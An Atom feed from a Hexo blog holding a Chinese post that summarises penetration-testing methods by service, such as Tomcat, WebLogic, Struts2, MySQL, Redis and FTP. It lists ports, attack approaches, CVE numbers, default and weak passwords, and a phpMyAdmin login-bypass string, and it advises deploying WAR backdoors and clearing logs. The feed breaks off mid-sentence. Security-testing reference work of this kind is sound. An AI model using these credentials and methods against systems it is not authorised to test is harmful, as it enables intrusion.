<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Love is a Moment Story</title>
  
  <subtitle>im very vegatable and very poor</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-01-13T09:27:51.470Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>zhang rui</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>个人渗透测试常用方法总结</title>
    <link href="http://example.com/2023/01/13/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/01/13/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-01-13T09:22:34.000Z</published>
    <updated>2023-01-13T09:27:51.470Z</updated>
    
    <content type="html"><![CDATA[<p><strong>一、渗透流程</strong></p><ol><li>信息收集</li><li>漏洞验证/漏洞攻击</li><li>提权，权限维持</li><li>日志清理</li></ol><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h3><p>一般先运行端口扫描和漏洞扫描获取可以利用的漏洞。多利用搜索引擎</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h4><p>有授权的情况下直接使用 nmap 、masscan 、自己写py脚本等端口扫描工具直接获取开放的端口和获取服务端的 banner 信息。使用 Python 端口扫描的介绍<a href="https://thief.one/2018/05/17/1/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.ioWindows">https://thief.one/2018/05/17/1/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.ioWindows</a> 下基于 Powershell 的端口扫描脚本。</p><p><a href="https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner/tree/master/Scripts">https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner/tree/master/Scripts</a></p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a><strong>漏洞扫描</strong></h4><p>使用Nessus、awvs等漏扫工具直接扫描目标，可以直接看到存活主机和主机的漏洞情况。</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="二、漏洞攻击"><a href="#二、漏洞攻击" class="headerlink" title="二、漏洞攻击"></a><strong>二、漏洞攻击</strong></h2><p>如果只是使用端口扫描，只是发现开放的端口，在获取 banner 信息后需要在漏洞库（seebug，ExploitDB ）上查找对应 CVE，后面就是验证漏洞是否存在。安全检查一般是尽可能的发现所有漏洞，对漏洞的风险进行评估和修复。入侵的话只关注高危远程代码执行和敏感信息泄露漏洞等可以直接利用的漏洞。漏洞验证可以找对应的 CVE 编号的 POC、EXP，利用代码在 ExploitDB 、seebug上查看或者在 github 上搜索是否有相关的漏洞验证或利用的工具。</p><h3 id="2-1-Web应用"><a href="#2-1-Web应用" class="headerlink" title="2.1 Web应用"></a><strong>2.1 Web应用</strong></h3><p>可以直接寻找注入、上传、代码执行、文件包含、跨站脚本、等漏洞，来进行攻击。一般可以使用 AWVS 直接扫描常见漏洞。</p><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="2-1-2-Web-中间件"><a href="#2-1-2-Web-中间件" class="headerlink" title="2.1.2 Web 中间件"></a><strong>2.1.2 Web 中间件</strong></h3><h4 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a><strong>（1）Tomcat</strong></h4><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p><ul><li><p>端口号：8080</p></li><li><p>攻击方法：</p></li><li><ul><li>默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</li><li>在管理后台部署 war 后门文件</li><li>远程代码执行漏洞</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://paper.seebug.org/399/">https://paper.seebug.org/399/</a></li><li><a href="http://www.freebuf.com/column/159200.html">http://www.freebuf.com/column/159200.html</a></li><li><a href="http://liehu.tass.com.cn/archives/836">http://liehu.tass.com.cn/archives/836</a></li><li><a href="http://www.mottoin.com/87173.html">http://www.mottoin.com/87173.html</a></li></ul></li></ul><h4 id="-4"><a href="#-4" class="headerlink" title=""></a></h4><h4 id="（2）-Jboss"><a href="#（2）-Jboss" class="headerlink" title="（2） Jboss"></a><strong>（2） Jboss</strong></h4><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p><ul><li><p>端口：8080</p></li><li><p>攻击方法：</p></li><li><ul><li>弱口令，爆破</li><li>管理后台部署 war 后门</li><li>反序列化</li><li>远程代码执行</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://www.vuln.cn/6300">http://www.vuln.cn/6300</a></li><li><a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</a></li><li><a href="https://www.zybuluo.com/websec007/note/838374">https://www.zybuluo.com/websec007/note/838374</a></li><li><a href="https://blog.csdn.net/u011215939/article/details/79141624">https://blog.csdn.net/u011215939/article/details/79141624</a></li></ul></li></ul><h4 id="-5"><a href="#-5" class="headerlink" title=""></a></h4><h4 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a><strong>（3）WebLogic</strong></h4><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><ul><li><p>端口：7001，7002</p></li><li><p>攻击方法：</p></li><li><ul><li>弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</li><li>管理后台部署 war 后门</li><li>SSRF</li><li>反序列化漏洞</li><li>weblogic_uac</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></li><li><a href="https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></li><li><a href="https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</a></li><li><a href="https://bbs.pediy.com/thread-224954.htm">https://bbs.pediy.com/thread-224954.htm</a></li></ul></li></ul><h4 id="-6"><a href="#-6" class="headerlink" title=""></a></h4><h4 id="（4）-WebSphere"><a href="#（4）-WebSphere" class="headerlink" title="（4） WebSphere"></a><strong>（4） WebSphere</strong></h4><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p><ul><li><p>端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p></li><li><p>攻击方法：</p></li><li><ul><li>控制台登录爆破</li><li>很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</li><li>反序列化</li><li>任意文件泄露</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</a></li><li><a href="http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</a></li><li><a href="https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</a></li></ul></li></ul><h4 id="（5）-Glassfish"><a href="#（5）-Glassfish" class="headerlink" title="（5） Glassfish"></a><strong>（5） Glassfish</strong></h4><h3 id="-7"><a href="#-7" class="headerlink" title=""></a></h3><h3 id="2-1-3-Web-框架"><a href="#2-1-3-Web-框架" class="headerlink" title="2.1.3 Web 框架"></a><strong>2.1.3 Web 框架</strong></h3><h4 id="（1）-Struts2"><a href="#（1）-Struts2" class="headerlink" title="（1） Struts2"></a><strong>（1） Struts2</strong></h4><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p><ul><li><p>可利用漏洞</p></li><li><ul><li>S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</li><li>S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</li><li>S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</li><li>S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</li><li>S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</li><li>S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</li><li>S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</li><li>S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</li><li>S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</li><li>S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://github.com/hktalent/myhktools">https://github.com/hktalent/myhktools</a></li><li><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a></li><li><a href="https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</a></li></ul></li></ul><h4 id="-8"><a href="#-8" class="headerlink" title=""></a></h4><h4 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a><strong>（2）Spring 框架</strong></h4><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p><ul><li><p>可利用漏洞</p></li><li><ul><li>CVE-2010-1622</li><li>CVE-2018-1274</li><li>CVE-2018-1270</li><li>CVE-2018-1273</li><li>反序列化</li><li>目录穿越</li></ul></li><li><p>参考</p></li><li><ul><li><a href="http://www.inbreak.net/archives/377">http://www.inbreak.net/archives/377</a></li><li><a href="https://www.secpulse.com/archives/71762.html">https://www.secpulse.com/archives/71762.html</a></li><li><a href="http://www.open-open.com/news/view/1225d07">http://www.open-open.com/news/view/1225d07</a></li><li><a href="https://xz.aliyun.com/t/2261">https://xz.aliyun.com/t/2261</a></li><li><a href="https://xz.aliyun.com/t/2252">https://xz.aliyun.com/t/2252</a></li></ul></li></ul><h3 id="-9"><a href="#-9" class="headerlink" title=""></a></h3><h3 id="2-1-4-Web-服务器"><a href="#2-1-4-Web-服务器" class="headerlink" title="2.1.4 Web 服务器"></a><strong>2.1.4 Web 服务器</strong></h3><ul><li><ul><li><p><strong>IIS</strong>：Windows 的 WWW 服务器</p></li><li><ul><li><p>端口：80</p></li><li><p>攻击方法：</p></li><li><ul><li>IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</li><li>短文件名枚举漏洞</li><li>远程代码执行</li><li>提权漏洞</li><li>解析漏洞</li></ul></li><li><p>参考： </p></li><li><p><a href="https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a></p></li><li><p><a href="http://www.freebuf.com/articles/4908.html">http://www.freebuf.com/articles/4908.html</a></p></li><li><p><a href="https://www.anquanke.com/post/id/85811">https://www.anquanke.com/post/id/85811</a></p></li></ul></li><li></li><li><p><strong>Apache</strong></p></li><li><ul><li>端口：80</li></ul></li><li><ul><li><p>攻击方法：</p><p>解析漏洞</p><p>目录遍历</p></li></ul></li><li></li><li><p><strong>Nginx</strong></p></li><li><ul><li>端口：80</li></ul></li><li><ul><li><p>攻击方法：</p></li><li><ul><li><p>解析漏洞</p></li><li><p>目录遍历</p></li><li><p>CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</p></li><li><p>参考：</p></li><li><ul><li><a href="https://www.seebug.org/vuldb/ssvid-92538">https://www.seebug.org/vuldb/ssvid-92538</a></li></ul></li></ul></li></ul></li><li><p><strong>lighttpd</strong></p></li><li><ul><li><p>端口：80</p></li><li><p>攻击方法：</p></li><li><ul><li>目录遍历</li></ul></li></ul></li></ul></li></ul><h2 id="2-2-常见运维系统"><a href="#2-2-常见运维系统" class="headerlink" title="2.2 常见运维系统"></a><strong>2.2 常见运维系统</strong></h2><p>一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。</p><h3 id="2-2-1-Gitlab"><a href="#2-2-1-Gitlab" class="headerlink" title="2.2.1 Gitlab"></a><strong>2.2.1 Gitlab</strong></h3><p>GitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。</p><ul><li><p>可利用漏洞：</p></li><li><ul><li>任意文件读取漏洞</li><li>意用户 token 泄露漏洞</li><li>命令执行漏洞</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/">http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/</a></li><li><a href="http://rinige.com/index.php/archives/577/">http://rinige.com/index.php/archives/577/</a></li></ul></li></ul><h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><h3 id="2-2-2-Jenkins"><a href="#2-2-2-Jenkins" class="headerlink" title="2.2.2 Jenkins"></a><strong>2.2.2 Jenkins</strong></h3><p>Jenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。</p><ul><li><p>可利用漏洞：</p></li><li><ul><li>远程代码执行漏洞</li><li>反序列化漏洞</li><li>未授权访问漏洞</li><li>登录入口爆破</li></ul></li><li><p>参考</p></li><li><ul><li><a href="https://www.cnblogs.com/backlion/p/6813260.html">https://www.cnblogs.com/backlion/p/6813260.html</a></li><li><a href="https://www.anquanke.com/post/id/86018">https://www.anquanke.com/post/id/86018</a></li><li><a href="https://paper.seebug.org/199/">https://paper.seebug.org/199/</a></li></ul></li></ul><h3 id="-11"><a href="#-11" class="headerlink" title=""></a></h3><h3 id="2-2-3-Puppet"><a href="#2-2-3-Puppet" class="headerlink" title="2.2.3 Puppet"></a><strong>2.2.3 Puppet</strong></h3><p>Puppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。</p><ul><li><p>可利用漏洞，很少公开的POC</p></li><li><ul><li>反序列化</li><li>远程命令执行</li></ul></li></ul><h3 id="-12"><a href="#-12" class="headerlink" title=""></a></h3><h3 id="2-2-4-Ansible"><a href="#2-2-4-Ansible" class="headerlink" title="2.2.4 Ansible"></a><strong>2.2.4 Ansible</strong></h3><p>Ansible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。</p><ul><li><p>可利用漏洞</p></li><li><ul><li>远程代码执行</li></ul></li></ul><h3 id="-13"><a href="#-13" class="headerlink" title=""></a></h3><h3 id="2-2-5-Nagios"><a href="#2-2-5-Nagios" class="headerlink" title="2.2.5 Nagios"></a><strong>2.2.5 Nagios</strong></h3><p>Nagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。</p><ul><li><p>可利用漏洞</p></li><li><ul><li>代码执行</li><li>SQLi</li></ul></li><li><p>参考</p></li><li><ul><li><a href="http://www.bugku.com/thread-87-1-1.html">http://www.bugku.com/thread-87-1-1.html</a></li><li><a href="http://www.mottoin.com/93936.html">http://www.mottoin.com/93936.html</a></li></ul></li></ul><h3 id="-14"><a href="#-14" class="headerlink" title=""></a></h3><h3 id="2-2-6-Zabbix"><a href="#2-2-6-Zabbix" class="headerlink" title="2.2.6 Zabbix"></a><strong>2.2.6 Zabbix</strong></h3><p>Zabbix 是一款强大的开源分布式监控系统, 能够将<code>SNMP</code>、<code>JMX</code>、<code>Zabbix Agent</code>提供的数据通过<code>WEB GUI</code>的方式进行展示.</p><ul><li><p>可利用漏洞（具体参考 ExploitDB）：</p></li><li><ul><li>远程代码执行</li><li>SQLi</li><li>shell 命令注入</li><li>认证绕过</li><li>默认账户与密码，默认口令 admin/zabbix，或者是guest/空</li></ul></li><li><p>参考</p></li><li><ul><li><a href="https://blog.csdn.net/ytuo1223/article/details/45937981">https://blog.csdn.net/ytuo1223/article/details/45937981</a></li><li><a href="http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></li><li><a href="http://www.mottoin.com/87570.html">http://www.mottoin.com/87570.html</a></li></ul></li></ul><h3 id="-15"><a href="#-15" class="headerlink" title=""></a></h3><h3 id="2-2-7-Cacit"><a href="#2-2-7-Cacit" class="headerlink" title="2.2.7 Cacit"></a><strong>2.2.7 Cacit</strong></h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p><ul><li><p>可利用漏洞</p></li><li><ul><li>任意代码执行</li><li>SQLi</li><li>登录爆破</li><li>默认密码admin/admin</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html</a></li></ul></li></ul><h3 id="-16"><a href="#-16" class="headerlink" title=""></a></h3><h3 id="2-2-8-Splunk"><a href="#2-2-8-Splunk" class="headerlink" title="2.2.8 Splunk"></a><strong>2.2.8 Splunk</strong></h3><p>Splunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。</p><ul><li><p>可利用漏洞</p></li><li><ul><li>信息泄露</li><li>命令注入</li><li>服务端请求伪造</li></ul></li><li><p>参考</p></li><li><ul><li>ExploitDB 搜索</li></ul></li></ul><h2 id="-17"><a href="#-17" class="headerlink" title=""></a></h2><h2 id="2-3-常见-Web-应用"><a href="#2-3-常见-Web-应用" class="headerlink" title="2.3 常见 Web 应用"></a><strong>2.3 常见 Web 应用</strong></h2><p>还有常见邮件应用、CMS 应用，在搜索引擎上查找对应的漏洞，利用已知漏洞进行攻击。</p><h3 id="2-3-1-邮件系统"><a href="#2-3-1-邮件系统" class="headerlink" title="2.3.1 邮件系统"></a><strong>2.3.1 邮件系统</strong></h3><p>一部分是使用腾讯企业邮箱、阿里企业邮箱的，很难有可利用的漏洞，另外一种是能独立部署的邮件系统，政企常用的邮箱应用：</p><ul><li>Coremail</li><li>亿邮</li><li>35互联</li><li>TurboMail</li><li>Exchange</li><li>IBM Lotus</li></ul><h3 id="-18"><a href="#-18" class="headerlink" title=""></a></h3><h3 id="2-3-2-CMS-应用"><a href="#2-3-2-CMS-应用" class="headerlink" title="2.3.2 CMS 应用"></a><strong>2.3.2 CMS 应用</strong></h3><h2 id="-19"><a href="#-19" class="headerlink" title=""></a></h2><h2 id="2-4-数据库-缓存-消息服务"><a href="#2-4-数据库-缓存-消息服务" class="headerlink" title="2.4 数据库/缓存/消息服务"></a><strong>2.4 数据库/缓存/消息服务</strong></h2><h3 id="2-4-1-MySQL数据库"><a href="#2-4-1-MySQL数据库" class="headerlink" title="2.4.1 MySQL数据库"></a><strong>2.4.1 MySQL数据库</strong></h3><ul><li><p>默认端口：3306</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令</li><li>身份认证漏洞：CVE-2012-2122</li><li>拒绝服务攻击</li><li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</li><li>提权</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://www.seebug.org/appdir/MySQL">https://www.seebug.org/appdir/MySQL</a></li><li><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390">http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390</a></li><li><a href="https://xz.aliyun.com/t/1491">https://xz.aliyun.com/t/1491</a></li></ul></li></ul><h3 id="-20"><a href="#-20" class="headerlink" title=""></a></h3><h3 id="2-4-2-MSSQL数据库"><a href="#2-4-2-MSSQL数据库" class="headerlink" title="2.4.2 MSSQL数据库"></a><strong>2.4.2 MSSQL数据库</strong></h3><ul><li><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令/使用系统用户</li><li>注入</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://www.anquanke.com/post/id/86011">https://www.anquanke.com/post/id/86011</a></li></ul></li></ul><h3 id="-21"><a href="#-21" class="headerlink" title=""></a></h3><h3 id="2-4-3-Oracle数据库"><a href="#2-4-3-Oracle数据库" class="headerlink" title="2.4.3 Oracle数据库"></a><strong>2.4.3 Oracle数据库</strong></h3><ul><li><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令</li><li>注入攻击；</li><li>漏洞攻击；-参考：</li><li><a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></li></ul></li></ul><h3 id="-22"><a href="#-22" class="headerlink" title=""></a></h3><h3 id="2-4-4-PostgreSQL数据库"><a href="#2-4-4-PostgreSQL数据库" class="headerlink" title="2.4.4 PostgreSQL数据库"></a><strong>2.4.4 PostgreSQL数据库</strong></h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p><ul><li><p>默认端口：5432</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令：postgres postgres</li><li>缓冲区溢出：CVE-2014-2669</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://drops.xmd5.com/static/drops/tips-6449.html">http://drops.xmd5.com/static/drops/tips-6449.html</a></li><li><a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a></li></ul></li></ul><h3 id="-23"><a href="#-23" class="headerlink" title=""></a></h3><h3 id="2-4-5-MongoDB数据库"><a href="#2-4-5-MongoDB数据库" class="headerlink" title="2.4.5 MongoDB数据库"></a><strong>2.4.5 MongoDB数据库</strong></h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似》</p><ul><li><p>默认端口：27017</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令</li><li>未授权访问；github有攻击代码；请点击</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://www.cnblogs.com/LittleHann/p/6252421.html">http://www.cnblogs.com/LittleHann/p/6252421.html</a></li><li><a href="http://www.tiejiang.org/19157.html">http://www.tiejiang.org/19157.html</a></li></ul></li></ul><h3 id="-24"><a href="#-24" class="headerlink" title=""></a></h3><h3 id="2-4-6-Redis数据库"><a href="#2-4-6-Redis数据库" class="headerlink" title="2.4.6 Redis数据库"></a><strong>2.4.6 Redis数据库</strong></h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><ul><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令</li><li>未授权访问+配合ssh key提权；</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://www.alloyteam.com/2017/07/12910/">http://www.alloyteam.com/2017/07/12910/</a></li></ul></li></ul><h3 id="-25"><a href="#-25" class="headerlink" title=""></a></h3><h3 id="2-4-7-SysBase数据库"><a href="#2-4-7-SysBase数据库" class="headerlink" title="2.4.7 SysBase数据库"></a><strong>2.4.7 SysBase数据库</strong></h3><ul><li><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破：弱口令</li><li>命令注入：</li></ul></li><li><p>参考</p></li></ul><h3 id="-26"><a href="#-26" class="headerlink" title=""></a></h3><h3 id="2-4-8-DB2-数据库"><a href="#2-4-8-DB2-数据库" class="headerlink" title="2.4.8 DB2 数据库"></a><strong>2.4.8 DB2 数据库</strong></h3><ul><li><p>默认端口：5000</p></li><li><p>攻击方法：</p></li><li><ul><li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071">http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</a></li></ul></li></ul><h2 id="-27"><a href="#-27" class="headerlink" title=""></a></h2><h2 id="2-5-常见服务-协议"><a href="#2-5-常见服务-协议" class="headerlink" title="2.5 常见服务/协议"></a><strong>2.5 常见服务/协议</strong></h2><h3 id="2-5-1-FTP-服务"><a href="#2-5-1-FTP-服务" class="headerlink" title="2.5.1 FTP 服务"></a><strong>2.5.1 FTP 服务</strong></h3><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p><ul><li>攻击方式：</li><li>爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</li><li>匿名访问：用户名：anonymous 密码：为空或任意邮箱</li><li>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</li><li>后门 vsftp</li><li>远程溢出</li><li>跳转攻击</li></ul><h3 id="-28"><a href="#-28" class="headerlink" title=""></a></h3><h3 id="2-5-2-NFS-服务"><a href="#2-5-2-NFS-服务" class="headerlink" title="2.5.2 NFS 服务"></a><strong>2.5.2 NFS 服务</strong></h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p><ul><li><p>攻击方法</p></li><li><ul><li>未授权访问</li></ul></li><li><p>参考</p></li><li><ul><li><a href="http://www.freebuf.com/articles/network/159468.html">http://www.freebuf.com/articles/network/159468.html</a></li><li><a href="http://www.vuln.cn/6368">http://www.vuln.cn/6368</a></li></ul></li></ul><h3 id="-29"><a href="#-29" class="headerlink" title=""></a></h3><h3 id="2-5-3-Samba服务"><a href="#2-5-3-Samba服务" class="headerlink" title="2.5.3 Samba服务"></a><strong>2.5.3 Samba服务</strong></h3><p>Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。</p><ul><li><p>攻击方法</p></li><li><ul><li>远程代码执行</li><li>弱口令</li><li>未授权访问（public）</li></ul></li><li><p>参考</p></li><li><ul><li><a href="http://www.91ri.org/17114.html">http://www.91ri.org/17114.html</a></li></ul></li></ul><h3 id="-30"><a href="#-30" class="headerlink" title=""></a></h3><h3 id="2-5-4-SSH-服务"><a href="#2-5-4-SSH-服务" class="headerlink" title="2.5.4 SSH 服务"></a><strong>2.5.4 SSH 服务</strong></h3><p>SSH 是协议，通常使用 OpenSSH 